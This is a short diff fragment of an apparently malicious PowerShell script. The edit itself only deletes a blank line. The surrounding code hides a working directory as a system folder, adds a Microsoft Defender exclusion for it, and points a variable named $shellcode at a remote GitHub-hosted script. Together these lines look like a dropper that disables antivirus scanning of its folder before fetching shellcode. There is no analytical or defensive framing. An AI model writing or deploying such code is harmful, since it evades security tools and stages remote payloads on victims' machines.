@@ -27,7 +27,6 @@ attrib +h +s $dir
 $temp = "$dir\temp"
 New-Item -ItemType Directory -Path $temp
 
-
 Add-MpPreference -ExclusionPath $dir
 
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
